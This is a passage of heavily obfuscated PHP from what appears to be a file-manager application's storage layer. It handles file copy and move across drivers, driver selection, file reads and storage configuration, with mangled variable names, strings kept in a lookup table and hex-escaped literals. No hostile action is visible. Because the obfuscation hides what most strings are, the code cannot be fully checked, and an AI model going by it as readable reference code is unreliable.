$Ïùß•êÇ, $æÌ§ªä°, $¨êÅ›á) { $óìÌìù£ =& $_SERVER[Îûáû“ş]; $Ïùß•êÇ = $°µÑ¤ş‰->getPath(rtrim($Ïùß•êÇ, $óìÌìù£[8]) . $óìÌìù£[8] . $æÌ§ªä°); $îô÷Í „ = $óìÌìù£[1159] . time() . rand_string(5); Hook::trigger($óìÌìù£[1160], $â†Éª©‚, $Ã²š¨ÆÑ, $°µÑ¤ş‰, $Ïùß•êÇ, $æÌ§ªä°, $îô÷Í „); if (self::driverIsSame($â†Éª©‚, $°µÑ¤ş‰)) { if ($¨êÅ›á) { $ĞßŒÚªñ = $°µÑ¤ş‰->moveFile($Ã²š¨ÆÑ, $Ïùß•êÇ); } else { $ĞßŒÚªñ = $°µÑ¤ş‰->copyFile($Ã²š¨ÆÑ, $Ïùß•êÇ); } Hook::trigger($óìÌìù£[1161], $â†Éª©‚, $Ã²š¨ÆÑ, $°µÑ¤ş‰, $Ïùß•êÇ, $æÌ§ªä°, $ĞßŒÚªñ); self::copyMoveKeepInfo($â†Éª©‚, $Ã²š¨ÆÑ, $ĞßŒÚªñ); return $ĞßŒÚªñ; } $„Áùù = TEMP_FILES; if ($GLOBALS[$óìÌìù£[6]][$óìÌìù£[89]][$óìÌìù£[795]]) { $„Áùù = $GLOBALS[$óìÌìù£[6]][$óìÌìù£[89]][$óìÌìù£[795]]; } $ßş—Ó©Õ = $„Áùù; mk_dir($ßş—Ó©Õ); $™”êÇÊ = $ßş—Ó©Õ . $îô÷Í „; $«çÁı«Ğ = $™”êÇÊ; $™”êÇÊ = $â†Éª©‚->download($Ã²š¨ÆÑ, $™”êÇÊ); $™”êÇÊ = $â†Éª©‚->iconvApp($™”êÇÊ); if (substr($™”êÇÊ, strlen($„Áùù)) == $„Áùù) { $¨êÅ›á = !0; } $ĞßŒÚªñ = $°µÑ¤ş‰->upload($Ïùß•êÇ, $™”êÇÊ, $¨êÅ›á); self::remove($«çÁı«Ğ); Hook::trigger($óìÌìù£[1161], $â†Éª©‚, $Ã²š¨ÆÑ, $°µÑ¤ş‰, $Ïùß•êÇ, $æÌ§ªä°, $ĞßŒÚªñ); self::copyMoveKeepInfo($â†Éª©‚, $Ã²š¨ÆÑ, $ĞßŒÚªñ); return $ĞßŒÚªñ; } private static function copyMoveKeepInfo($æöá¡éÙ, $‡Å§İğî, $Èñ°Ì×–) { if (!$Èñ°Ì×–) { return; } $“²·ô€ = $æöá¡éÙ->info($‡Å§İğî); if (!is_array($“²·ô€)) { return; } IO::setModifyTime($Èñ°Ì×–, $“²·ô€[$_SERVER[Îûáû“ş][85]]); } public static function pathFather($ØŠš…¨—) { $¿¶•¥‰Á = IO::init($ØŠš…¨—); $ø’…ÛÈª = $¿¶•¥‰Á->pathFather($¿¶•¥‰Á->path); return $¿¶•¥‰Á->getPathOuter($ø’…ÛÈª); } public static function fileOut($‰±ú¹É, $ÔÇ–Ğä = false, $åˆ³ŸÌ = false, $ğÑ›ßá· = '') { $àÌíß¨Â = self::driverMake($‰±ú¹É); if ($àÌíß¨Â->isFileOutServer()) { return $àÌíß¨Â->fileOutServer($‰±ú¹É, $ÔÇ–Ğä, $åˆ³ŸÌ, $ğÑ›ßá·); } return $àÌíß¨Â->fileOut($‰±ú¹É, $ÔÇ–Ğä, $åˆ³ŸÌ, $ğÑ›ßá·); } public static function fileOutImage($å¦Çµßƒ, $”ÜÅÔèó = 250) { $éË¡Øæ´ = array(250, 600, 1200, 2000, 3000, 5000); for ($æ§‰¾ğ = 0; $æ§‰¾ğ < count($éË¡Øæ´); $æ§‰¾ğ++) { if ($æ§‰¾ğ == 0 && $”ÜÅÔèó <= $éË¡Øæ´[$æ§‰¾ğ]) { $”ÜÅÔèó = $éË¡Øæ´[$æ§‰¾ğ]; break; } else { if ($”ÜÅÔèó > $éË¡Øæ´[$æ§‰¾ğ - 1] && $”ÜÅÔèó <= $éË¡Øæ´[$æ§‰¾ğ]) { $”ÜÅÔèó = $éË¡Øæ´[$æ§‰¾ğ]; break; } else { if ($æ§‰¾ğ == count($éË¡Øæ´) - 1 && $”ÜÅÔèó > $éË¡Øæ´[$æ§‰¾ğ]) { $”ÜÅÔèó = $éË¡Øæ´[$æ§‰¾ğ]; break; } } } } $ü«ÅĞØì = self::driverMake($å¦Çµßƒ); if ($ü«ÅĞØì->isFileOutServer()) { return $ü«ÅĞØì->fileOutImageServer($å¦Çµßƒ, $”ÜÅÔèó); } return $ü«ÅĞØì->fileOutImage($å¦Çµßƒ, $”ÜÅÔèó); } private static function driverIsSame($ ûØ€ÓÈ, $ ­°é©¸) { $ÓŒÈî« =& $_SERVER[Îûáû“ş]; $™½Ë„òü = $ ûØ€ÓÈ->getType(); $³™ÑëÂê = $ ­°é©¸->getType(); if ($™½Ë„òü != $³™ÑëÂê) { return !1; } if ($™½Ë„òü == $ÓŒÈî«[756]) { return !0; } if ($™½Ë„òü == $ÓŒÈî«[106]) { return !0; } if ($ ûØ€ÓÈ->pathDriver == $ ­°é©¸->pathDriver) { return !0; } return !1; } public static function copyUpdate($İª”ÑÃ, $ğÅ‹”ı) { $àòÑª§Š =& $_SERVER[Îûáû“ş]; if (!IO::exist($İª”ÑÃ)) { return !1; } if (!IO::exist($ğÅ‹”ı)) { IO::mkdir($ğÅ‹”ı); } $Ï‚ÃàÓÛ = array_to_keyvalue(self::listAllSimple($İª”ÑÃ), $àòÑª§Š[84]); $Ë°¼¼ú = array_to_keyvalue(self::listAllSimple($ğÅ‹”ı), $àòÑª§Š[84]); $Üæİ•©¬ = array(); $“úÈ„¤± = array(); foreach ($Ï‚ÃàÓÛ as $µêË»ïµ => $ü´’¥—ç) { if (isset($Ë°¼¼ú[$µêË»ïµ])) { if ($ü´’¥—ç[$àòÑª§Š[75]] == 1) { continue; } if ($Ë°¼¼ú[$µêË»ïµ][$àòÑª§Š[76]] == $ü´’¥—ç[$àòÑª§Š[76]]) { continue; } } if ($ü´’¥—ç[$àòÑª§Š[75]] == 1) { $“úÈ„¤±[] = $ğÅ‹”ı . $àòÑª§Š[8] . trim($µêË»ïµ, $àòÑª§Š[8]); continue; } $šÅíèˆ’ = strstr(trim($µêË»ïµ, $àòÑª§Š[8]), $àòÑª§Š[8]) ? get_path_father($µêË»ïµ) : $àòÑª§Š[12]; $Üæİ•©¬[] = array($àòÑª§Š[1162] => $ü´’¥—ç[$àòÑª§Š[86]], $àòÑª§Š[1163] => rtrim($ğÅ‹”ı, $àòÑª§Š[8]) . $àòÑª§Š[8] . $šÅíèˆ’, $àòÑª§Š[1164] => $ü´’¥—ç); } $ÅÓ´Å‚Î = array($àòÑª§Š[200] => $Üæİ•©¬, $àòÑª§Š[75] => $“úÈ„¤±); Hook::trigger($àòÑª§Š[1165], $İª”ÑÃ, $ğÅ‹”ı, $ÅÓ´Å‚Î); foreach ($“úÈ„¤± as $ü´’¥—ç) { IO::mkdir($ü´’¥—ç); } foreach ($Üæİ•©¬ as $ü´’¥—ç) { IO::copy($ü´’¥—ç[$àòÑª§Š[1162]], $ü´’¥—ç[$àòÑª§Š[1163]], REPEAT_REPLACE); } } public static function fileSubstr($¦°ÏÛÎÔ, $ÂµØî¦ù, $öô‘Ö‘ = false) { $³ù‹³ò =& $_SERVER[Îûáû“ş]; $ÄˆŞ‘àÛ = self::driverMake($¦°ÏÛÎÔ); $“¼ÓÔ»© = $ÄˆŞ‘àÛ->size($¦°ÏÛÎÔ); $‹ğĞõ§Ù = $ÂµØî¦ù; $× Öİ‘ = $öô‘Ö‘; if ($ÂµØî¦ù < 0) { $ÂµØî¦ù = $“¼ÓÔ»© + $ÂµØî¦ù; } if ($öô‘Ö‘ === !1) { $öô‘Ö‘ = $“¼ÓÔ»© - $ÂµØî¦ù; } if ($ÂµØî¦ù + $öô‘Ö‘ > $“¼ÓÔ»©) { $öô‘Ö‘ = $“¼ÓÔ»© - $ÂµØî¦ù; } if (!$“¼ÓÔ»© && $ÄˆŞ‘àÛ->getType() == $³ù‹³ò[106] && !$ÄˆŞ‘àÛ->exist($¦°ÏÛÎÔ)) { $…¸±î·õ = get_path_this($¦°ÏÛÎÔ); $óÕØıÔ = parse_url_query($…¸±î·õ); if (is_array($óÕØıÔ) && isset($óÕØıÔ[$³ù‹³ò[32]])) { $…¸±î·õ = urldecode($óÕØıÔ[$³ù‹³ò[32]]); } throw new Exception($³ù‹³ò[1166] . LNG($³ù‹³ò[1167]) . $³ù‹³ò[968] . clear_html($…¸±î·õ) . $³ù‹³ò[12]); } if ($öô‘Ö‘ <= 0) { return $³ù‹³ò[12]; } if ($ÂµØî¦ù < 0 || $ÂµØî¦ù >= $“¼ÓÔ»© || $öô‘Ö‘ > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\x65\122\145\x61\144\40\x65\x72\162\x6f\x72\x21\x20\163\x74\141\x72\x74\x3d{$ÂµØî¦ù}\73\x6c\145\x6e\x67\164\150\75{$öô‘Ö‘}\x3b\40\x73\151\x7a\145\75{$“¼ÓÔ»©}\73"); } $øø¡ƒöŞ = $ÄˆŞ‘àÛ->fileSubstr($¦°ÏÛÎÔ, $ÂµØî¦ù, $öô‘Ö‘); if (!$øø¡ƒöŞ && $öô‘Ö‘ && isset($GLOBALS[$³ù‹³ò[1168]])) { throw new Exception($GLOBALS[$³ù‹³ò[1168]][$³ù‹³ò[1169]]); } return $øø¡ƒöŞ; } private static function driverMake(&$ Ù´œÀ) { $ÀÉÕœ‰· =& $_SERVER[Îûáû“ş]; $ÖË³°‡š = KodIO::parse($ Ù´œÀ); if (!self::$driverListSystem) { $óÏÁ¼„ş = Model($ÀÉÕœ‰·[766])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($óÏÁ¼„ş, $ÀÉÕœ‰·[399]); } if ($ÖË³°‡š[$ÀÉÕœ‰·[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ÖË³°‡š[$ÀÉÕœ‰·[399]]]) { return !1; } $ Ù´œÀ = $ÖË³°‡š[$ÀÉÕœ‰·[1170]]; $ß«Ã´ºÄ = self::driverGet($ÖË³°‡š, $ Ù´œÀ); return $ß«Ã´ºÄ; } private static function driverGet($«ŞÁòÇµ, &$«×½¦­ó) { $Ú¡­í†Ç =& $_SERVER[Îûáû“ş]; $Ä·Ïã€ª = $«ŞÁòÇµ[$Ú¡­í†Ç[1171]]; $Ô«ëôí = $«ŞÁòÇµ[$Ú¡­í†Ç[399]]; switch ($«ŞÁòÇµ[$Ú¡­í†Ç[33]]) { case KodIO::KOD_IO: $ê–ı©Ù = self::$driverListSystem[$Ô«ëôí]; break; case KodIO::KOD_SOURCE: $«×½¦­ó = $Ô«ëôí . $«×½¦­ó; $ê–ı©Ù = array($Ú¡­í†Ç[1172] => $Ú¡­í†Ç[1173], $Ú¡­í†Ç[6] => $«ŞÁòÇµ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ŸŠÒ£ØÒ = $GLOBALS[$Ú¡­í†Ç[1174]]; self::$driverListUser = array_to_keyvalue($ŸŠÒ£ØÒ, $Ú¡­í†Ç[399]); } $ê–ı©Ù = self::$driverListUser[$Ô«ëôí]; break; case KodIO::KOD_SHARE_LINK: $ê–ı©Ù = array($Ú¡­í†Ç[1172] => $Ú¡­í†Ç[1175], $Ú¡­í†Ç[6] => $«ŞÁòÇµ); $¶²Íí¸Ÿ = Action($Ú¡­í†Ç[1176])->sharePathInfo($«ŞÁòÇµ[$Ú¡­í†Ç[84]]); $«×½¦­ó = $¶²Íí¸Ÿ[$Ú¡­í†Ç[402]]; if (!$¶²Íí¸Ÿ[$Ú¡­í†Ç[402]]) { $Êš¡±À = Model($Ú¡­í†Ç[592])->getInfo($¶²Íí¸Ÿ[$Ú¡­í†Ç[593]]); $«×½¦­ó = KodIO::clear($Êš¡±À[$Ú¡­í†Ç[1177]] . $«ŞÁòÇµ[$Ú¡­í†Ç[1170]]); $«ŞÁòÇµ[$Ú¡­í†Ç[486]] = $Êš¡±À; $«ŞÁòÇµ[$Ú¡­í†Ç[1153]] = $«×½¦­ó; $ê–ı©Ù = array($Ú¡­í†Ç[1172] => $Ú¡­í†Ç[1178], $Ú¡­í†Ç[6] => $«ŞÁòÇµ); } break; case KodIO::KOD_SHARE_ITEM: $ê–ı©Ù = array($Ú¡­í†Ç[1172] => $Ú¡­í†Ç[1179], $Ú¡­í†Ç[6] => $«ŞÁòÇµ); $Êš¡±À = Model($Ú¡­í†Ç[592])->getInfo($«ŞÁòÇµ[$Ú¡­í†Ç[399]]); if ($Êš¡±À[$Ú¡­í†Ç[402]] == $Ú¡­í†Ç[198]) { $«×½¦­ó = KodIO::clear($Êš¡±À[$Ú¡­í†Ç[1177]] . $«ŞÁòÇµ[$Ú¡­í†Ç[1170]]); $«ŞÁòÇµ[$Ú¡­í†Ç[486]] = $Êš¡±À; $«ŞÁòÇµ[$Ú¡­í†Ç[1153]] = $«×½¦­ó; $ê–ı©Ù = array($Ú¡­í†Ç[1172] => $Ú¡­í†Ç[1180], $Ú¡­í†Ç[6] => $«ŞÁòÇµ); } else { if (!$«×½¦­ó) { $«×½¦­ó = $Êš¡±À[$Ú¡­í†Ç[402]]; } } break; default: $«×½¦­ó = $«ŞÁòÇµ[$Ú¡­í†Ç[84]]; $ê–ı©Ù = array($Ú¡­í†Ç[1172] => $Ú¡­í†Ç[1181]); break; } $ã“¿²˜Õ = $«ŞÁòÇµ[$Ú¡­í†Ç[84]]; if (!isset(self::$driverCache[$ã“¿²˜Õ])) { $ŞùˆÔ = strtolower($ê–ı©Ù[$Ú¡­í†Ç[95]]); $¿¦¸Ğ´ = $GLOBALS[$Ú¡­í†Ç[6]][$Ú¡­í†Ç[89]][$Ú¡­í†Ç[825]]; $ÇõÖ¯×¨ = $Ú¡­í†Ç[74] . (isset($¿¦¸Ğ´[$ŞùˆÔ]) ? $¿¦¸Ğ´[$ŞùˆÔ] : ucfirst($ŞùˆÔ)); if (!class_exists($ÇõÖ¯×¨)) { show_json("{$ÇõÖ¯×¨}\40\x6e\x6f\164\x20\x65\x78\x69\x73\x74\x73\41", !1); } $Ùª¶ÏÕú = isset($ê–ı©Ù[$Ú¡­í†Ç[6]]) ? $ê–ı©Ù[$Ú¡­í†Ç[6]] : !1; self::$driverCache[$ã“¿²˜Õ] = new $ÇõÖ¯×¨($Ùª¶ÏÕú); } $É¹¶Ş°» = self::$driverCache[$ã“¿²˜Õ]; $É¹¶Ş°»->pathDriver = $Ä·Ïã€ª; $É¹¶Ş°»->pathBase = $Ú¡­í†Ç[12]; if (isset($ê–ı©Ù[$Ú¡­í†Ç[6]][$Ú¡­í†Ç[1182]])) { $É¹¶Ş°»->pathBase = rtrim($ê–ı©Ù[$Ú¡­í†Ç[6]][$Ú¡­í†Ç[1182]], $Ú¡­í†Ç[8]) . $Ú¡­í†Ç[8]; $«×½¦­ó = $É¹¶Ş°»->pathBase . ltrim($«×½¦­ó, $Ú¡­í†Ç[8]); } $«×½¦­ó = $É¹¶Ş°»->getPath($«×½¦­ó); if (isset($«ŞÁòÇµ[$Ú¡­í†Ç[1153]])) { $«×½¦­ó = $«ŞÁòÇµ[$Ú¡­í†Ç[1153]]; } $É¹¶Ş°»->path = $«×½¦­ó; return $É¹¶Ş°»; } public static function errorTips($‚á‘û£Ä = false) { $ËññÓò½ =& $_SERVER[Îûáû“ş]; static $Àæƒ¶ºÕ = array(); $ñô¸†»ğ = 1000; if ($‚á‘û£Ä === -1) { return $Àæƒ¶ºÕ ? $Àæƒ¶ºÕ[count($Àæƒ¶ºÕ) - 1] : $ËññÓò½[12]; } if ($‚á‘û£Ä === !1) { return implode($ËññÓò½[231], $Àæƒ¶ºÕ); } if (count($Àæƒ¶ºÕ) >= $ñô¸†»ğ) { $Àæƒ¶ºÕ = array_slice($Àæƒ¶ºÕ, $ñô¸†»ğ * 0.5, $ñô¸†»ğ); } $Àæƒ¶ºÕ[] = $‚á‘û£Ä; write_log($ËññÓò½[162] . ACTION . $ËññÓò½[1183] . $‚á‘û£Ä, $ËññÓò½[1184]); } public static function getLastError($¹¥å—² = '') { $‰äÏ˜è¡ = self::errorTips(-1); return $‰äÏ˜è¡ ? $‰äÏ˜è¡ : $¹¥å—²; } } goto F¾èâ—ò; fÔô½º„: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\56\x73\157\x75\162\143\x65\123\145\x63\162\145\164\x4c\x69\163\164"; public $field = array("\163\x6f\165\162\143\145\111\x44", "\x74\171\x70\x65\x49\104", "\x63\x72\x65\x61\164\x65\125\163\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\x2e\x73\x74\157\x72\x61\147\x65\114\x69\x73\x74"; public $field = array("\x6e\141\155\145", "\163\x69\x7a\x65\x4d\x61\170", "\x73\x79\163\164\145\x6d", "\x64\145\x66\x61\x75\x6c\164", "\144\x72\151\x76\145\x72", "\143\157\156\x66\151\x67"); public function listData($–«×„‘ò = false, $ÒÊ Ìı = "\155\157\x64\x69\x66\x79\x54\151\155\x65", $ÙåÓÅêã = false) { $¡®¨Õ =& $_SERVER[Îûáû“ş]; $Úéæå· = parent::listData($–«×„‘ò, $ÒÊ Ìı, $ÙåÓÅêã); if ($–«×„‘ò) { return $Úéæå·; } $Ø‰Óßéî = $this->ioSizeUseGet(array_to_keyvalue($Úéæå·, $¡®¨Õ[12], $¡®¨Õ[399])); foreach ($Úéæå· as $ìèĞ•áˆ => $«†ˆİ÷) { unset($Úéæå·[$ìèĞ•áˆ][$¡®¨Õ[6]]); $Úéæå·[$ìèĞ•áˆ][$¡®¨Õ[1850]] = isset($Ø‰Óßéî[$«†ˆİ÷[$¡®¨Õ[399]]]) ? $Ø‰Óßéî[$«†ˆİ÷[$¡®¨Õ[399]]] : 0; } return $Úéæå·; } public function ioSizeUseGet($÷½Ü¼Ñƒ) { $ûÙåòŒ =& $_SERVER[Îûáû“ş]; if (!$÷½Ü¼Ñƒ) { return array(); } $ò®·†Ô = $ûÙåòŒ[2178] . implode($ûÙåòŒ[50], $÷½Ü¼Ñƒ); $Ö”±Ë÷ = Cache::get($ò®·†Ô); if ($Ö”±Ë÷) { return $Ö”±Ë÷; } $¶±¬ã¤ó = array($ûÙåòŒ[816] => $ûÙåòŒ[399], $ûÙåòŒ[2179] => $ûÙåòŒ[76]); $ÉÈ¸´°¾ = array($ûÙåòŒ[816] => array($ûÙåòŒ[7], $÷½Ü¼Ñƒ)); $Ö”±Ë÷ = Model($ûÙåòŒ[788])->field($¶±¬ã¤ó)->where($ÉÈ¸´°¾)->group($ûÙåòŒ[816])->select(); $Ö”±Ë÷ = array_to_keyvalue($Ö”±Ë÷, $ûÙåòŒ[399], $ûÙåòŒ[76]); Cache::set($ò®·†Ô, $Ö”±Ë÷, 600); return $Ö”±Ë÷; } public function getConfig($œÍÅ×†ò) { $®¨Ğ¹Ìö = parent::listData($œÍÅ×†ò); return json_decode($®¨Ğ¹Ìö[$_SERVER[Îûáû“ş][6]], !0); } public function update($¹Íè÷Êä, $éİ”ÅÚ) { $áÍêİŞš =& $_SERVER[Îûáû“ş]; $ Ëô è» = $éİ”ÅÚ[$áÍêİŞš[32]]; $™­À»ºù = array_to_keyvalue(parent::listData(), $áÍêİŞš[32]); if (isset($™­À»ºù[$ Ëô è»]) && $™­À»ºù[$ Ëô è»][$áÍêİŞš[399]] != $¹Íè÷Êä) { return !1; } $this->checkPwd($¹Íè÷Êä, $éİ”ÅÚ); if (isset($éİ”ÅÚ[$áÍêİŞš[2180]]) && $éİ”ÅÚ[$áÍêİŞš[2180]] == $áÍêİŞš[88]) { $this->checkConfig($éİ”ÅÚ); } unset($éİ”ÅÚ[$áÍêİŞš[2180]]); $ı÷§¥ş = parent::update($¹Íè÷Êä, $éİ”ÅÚ); if ($ı÷§¥ş && $éİ”ÅÚ[$áÍêİŞš[37]]) { $±ä¯ê ì = 0; foreach ($™­À»ºù as $Î¦öîŸö) { if ($Î¦öîŸö[$áÍêİŞš[37]] && $Î¦öîŸö[$áÍêİŞš[399]] != $¹Íè÷Êä) { $±ä¯ê ì = $Î¦öîŸö[$áÍêİŞš[399]]; parent::update($Î¦öîŸö[$áÍêİŞš[399]], array($áÍêİŞš[37] => 0)); } } $this->updateBackup($¹Íè÷Êä, $±ä¯ê ì); } return $ı÷§¥ş; } public function add($¸ï®öíğ) { $ì˜Ñ¼Ÿ =& $_SERVER[Îûáû“ş]; $Æ¼’Ïò = array_to_keyvalue(parent::listData(), $ì˜Ñ¼Ÿ[32]); if (isset($Æ¼’Ïò[$¸ï®öíğ[$ì˜Ñ¼Ÿ[32]]])) { return !1; } $this->checkConfig($¸ï®öíğ); $ÕŠ¨×ó = parent::insert($¸ï®öíğ); if ($ÕŠ¨×ó && $¸ï®öíğ[$ì˜Ñ¼Ÿ[37]]) { foreach ($Æ¼’Ïò as $ç„–Â¡Ì) { if ($ç„–Â¡Ì[$ì˜Ñ¼Ÿ[37]]) { parent::update($ç„–Â¡Ì[$ì˜Ñ¼Ÿ[399]], array($ì˜Ñ¼Ÿ[37] => 0)); } } } return $ÕŠ¨×ó; } public function updateBackup($‹á ÃÓ, $ĞáÅÓ×‰) { $ìÀĞÆşË =& $_SERVER[Îûáû“ş]; if (!$ĞáÅÓ×‰) { return; } $¿©õ«¾ñ = Model($ìÀĞÆşË[747])->config(); if ($¿©õ«¾ñ[$ìÀĞÆşË[1640]] != $ìÀĞÆşË[88] || $¿©õ«¾ñ[$ìÀĞÆşË[750]] != $ĞáÅÓ×‰) { return; } $ÁË¯° = Model($ìÀĞÆşË[769])->get($ìÀĞÆşË[779]); $ÁË¯° = json_decode($ÁË¯°, !0); if (!$ÁË¯°) { return; } $ÁË¯°[$ìÀĞÆşË[750]] = $‹á ÃÓ; Model($ìÀĞÆşË[769])->set(array($ìÀĞÆşË[779] => $ÁË¯°)); } public function checkPwd($¾¥©­Õ, &$êÖÆ‚éø) { $¬Şû±› =& $_SERVER[Îûáû“ş]; if (empty($êÖÆ‚éø[$¬Şû±›[6]])) { return; } $†Õ“¬î› = json_decode($êÖÆ‚éø[$¬Şû±›[6]], !0); $©Ïš–¼Ü = $¬Şû±›[12]; $ÁçôÕÑš = array($¬Şû±›[2181], $¬Şû±›[2182], $¬Şû±›[891]); foreach ($ÁçôÕÑš as $Êõš»ìø) { if (isset($†Õ“¬î›[$Êõš»ìø])) { $©Ïš–¼Ü = $Êõš»ìø; break; } } if (!$©Ïš–¼Ü) { return; } $É›ĞÆä® = $this->getConfig($¾¥©­Õ); $¯Íß’À = $É›ĞÆä®[$©Ïš–¼Ü]; $ï±‡ë´ = $†Õ“¬î›[$©Ïš–¼Ü]; if ($ï±‡ë´ == str_repeat($¬Şû±›[189], strlen($¯Íß’À))) { $†Õ“¬î›[$©Ïš–¼Ü] = $¯Íß’À; $êÖÆ‚éø[$¬Şû±›[6]] = json_encode($†Õ“¬î›); } else { if ($ï±‡ë´ != $¯Íß’À) { $êÖÆ‚éø[$¬Şû±›[2180]] = $¬Şû±›[88]; } } } public function checkConfig(&$ß…Ç¿›¸, $éåÑíˆ÷ = false) { $€êæ¦…á =& $_SERVER[Îûáû“ş]; $Æ•±ÕÅ = strtolower($ß…Ç¿›¸[$€êæ¦…á[95]]); $‘ÜéØ‚Î = json_decode($ß…Ç¿›¸[$€êæ¦…á[6]], !0); foreach ($‘ÜéØ‚Î as $×ŠõŒ => $‹‚–Úá€) { $‘ÜéØ‚Î[$×ŠõŒ] = trim($‹‚–Úá€); } $‘ÜéØ‚Î[$€êæ¦…á[2183]] = rand_string(6); $˜û¡ï„£ = $GLOBALS[$€êæ¦…á[6]][$€êæ¦…á[89]][$€êæ¦…á[825]]; $’³Şº™İ = isset($˜û¡ï„£[$Æ•±ÕÅ]) ? $˜û¡ï„£[$Æ•±ÕÅ] : ucfirst($Æ•±ÕÅ); $˜Éø‡‘° = $€êæ¦…á[74] . $’³Şº™İ; if (!$’³Şº™İ || !class_exists($˜Éø‡‘°)) { if ($éåÑíˆ÷) { return LNG($€êæ¦…á[2184]); } write_log(array($€êæ¦…á[2185], $ß…Ç¿›¸, get_caller_info()), $€êæ¦…á[2186]); show_json(LNG($€êæ¦…á[2184]), !1, $ß…Ç¿›¸); } $½œ±Û™Ú = new $˜Éø‡‘°($‘ÜéØ‚Î); if (in_array($Æ•±ÕÅ, $½œ±Û™Ú->objectDriver)) { if (!$½œ±Û™Ú->isBucketCors() && !$½œ±Û™Ú->setBucketCors()) { $çñ‰û = LNG($€êæ¦…á[2187]); $çñ‰û .= $€êæ¦…á[2188] . LNG($€êæ¦…á[2189]); if ($éåÑíˆ÷) { return $çñ‰û; } show_json($çñ‰û, !1); } } $¥½¦îŸã = rtrim($‘ÜéØ‚Î[$€êæ¦…á[1182]], $€êæ¦…á[8]) . $€êæ¦…á[8]; $éÄŠàÜ = $½œ±Û™Ú->getPath($¥½¦îŸã . $€êæ¦…á[1186]); if (!$½œ±Û™Ú->mkfile($éÄŠàÜ)) { if ($éåÑíˆ÷) { return LNG($€êæ¦…á[2187]); } show_json(LNG($€êæ¦…á[2187]), !1); } $‘ÜéØ‚Î[$€êæ¦…á[1182]] = $¥½¦îŸã; $ß…Ç¿›¸[$€êæ¦…á[6]] = json_encode($‘ÜéØ‚Î); $ß…Ç¿›¸[$€êæ¦…á[95]] = $’³Şº™İ; return !0; } public function driverListSystem() { $ıêÒ¯Ñ› =& $_SERVER[Îûáû“ş]; $™Ğáì¦Ú = parent::listData(); $‘Õ‘»Û­ = array(); foreach ($™Ğáì¦Ú as $ÂÅÓÜ‹‘) { unset($ÂÅÓÜ‹‘[$ıêÒ¯Ñ›[201]], $ÂÅÓÜ‹‘[$ıêÒ¯Ñ›[85]]); $ÂÅÓÜ‹‘[$ıêÒ¯Ñ›[6]] = json_decode($ÂÅÓÜ‹‘[$ıêÒ¯Ñ›[6]], !0); $‘Õ‘»Û­[] = $ÂÅÓÜ‹‘; } return $‘Õ‘»Û­; } public function defaultDriver() { $á“á¢áø =& $_SERVER[Îûáû“ş]; $ã¯şËîö = parent::listData(); $Ñ†™Û¾à = array_filter_by_field($ã¯şËîö, $á“á¢áø[37], 1); $Ñ†™Û¾à = $Ñ†™Û¾à[0]; if ($Ñ†™Û¾à) { $Ñ†™Û¾à[$á“á¢áø[6]] = json_decode($Ñ†™Û¾à[$á“á¢áø[6]], !0); } return $Ñ†™Û¾à; } public function driverInfo($¡Éú‡£Ô) { $ëÁ©êúÛ =& $_SERVER[Îûáû“ş]; $Ï‘ôÑ‘Õ = array_to_keyvalue(parent::listData(), $ëÁ©êúÛ[399]); if (!isset($Ï‘ôÑ‘Õ[$¡Éú‡£Ô])) { return !1; } $®²ˆª = $Ï‘ôÑ‘Õ[$¡Éú‡£Ô]; $®²ˆª[$ëÁ©êúÛ[6]] = json_decode($®²ˆª[$ëÁ©êúÛ[6]], !0); return $®²ˆª; } public function remove($ÀÂ‹Æ¼˜) { $this->removeShareItems($ÀÂ‹Æ¼˜); return parent::remove($ÀÂ‹Æ¼˜); } public function removeWithFile($ÙÊ¿òÔä, $ğ…ô´Û¦) { $ª¼Ì÷õï =& $_SERVER[Îûáû“ş]; $»’€‹ã› = array($ª¼Ì÷õï[816] => $ÙÊ¿òÔä); $¶ÖÁŠ» = Model($ª¼Ì÷õï[471])->where($»’€‹ã›)->count(); $ŒÓÙ×˜¯ = Model($ª¼Ì÷õï[471])->where($»’€‹ã›)->sum($ª¼Ì÷õï[76]); $›ÚÙò…¥ = $ğ…ô´Û¦ . $ª¼Ì÷õï[2190] . $ÙÊ¿òÔä; $İ±×Æ¸ = LNG($ğ…ô´Û¦ == $ª¼Ì÷õï[548] ? $ª¼Ì÷õï[2191] : $ª¼Ì÷õï[2192]); $ªµ¿Ë¨ˆ = new TaskFileTransfer($›ÚÙò…¥, $ª¼Ì÷õï[2186], $¶ÖÁŠ», $İ±×Æ¸ . "\50{$ÙÊ¿òÔä}\x29"); $ªµ¿Ë¨ˆ->task[$ª¼Ì÷õï[762]] = (double) $ŒÓÙ×˜¯; $»õÁÓ = KodIO::defaultDriver(); $òÔêÅîí = $»õÁÓ[$ª¼Ì÷õï[399]]; $Ï²îó… = "\173\x69\157\72{$òÔêÅîí}\x7d\57"; $¾“’ŠÚ¥ = !0; $–‘ºÂ¼õ = array(); $ìüï†ª¢ = Model($ª¼Ì÷õï[200])->where($»’€‹ã›)->field($ª¼Ì÷õï[2193])->select(); foreach ($ìüï†ª¢ as $óå­…™®) { $Ù¨¾á¦ş = $óå­…™®[$ª¼Ì÷õï[84]]; $ëãµƒ¤„ = $Ï²îó… . str_replace("\x7b\x69\x6f\x3a{$ÙÊ¿òÔä}\175\57", $ª¼Ì÷õï[12], $Ù¨¾á¦ş); if (!IO::exist($Ù¨¾á¦ş)) { $–‘ºÂ¼õ[] = $óå­…™®[$ª¼Ì÷õï[468]]; $ªµ¿Ë¨ˆ->updateFileEnd($óå­…™®[$ª¼Ì÷õï[32]], $óå­…™®[$ª¼Ì÷õï[76]]); continue; } if (IO::exist($ëãµƒ¤„)) { $ªµ¿Ë¨ˆ->updateFileEnd($óå­…™®[$ª¼Ì÷õï[32]], $óå­…™®[$ª¼Ì÷õï[76]]); continue; } if (!IO::move($Ù¨¾á¦ş, get_path_father($ëãµƒ¤„))) { $¾“’ŠÚ¥ = !1; break; } $»’€‹ã› = array($ª¼Ì÷õï[468] => $óå­…™®[$ª¼Ì÷õï[468]]); $ÈÑÌ÷è = array($ª¼Ì÷õï[816] => $òÔêÅîí, $ª¼Ì÷õï[84] => $ëãµƒ¤„); Model($ª¼Ì÷õï[200])->where($»’€‹ã›)->save($ÈÑÌ÷è); } $this->removeByFileID($–‘ºÂ¼õ); if 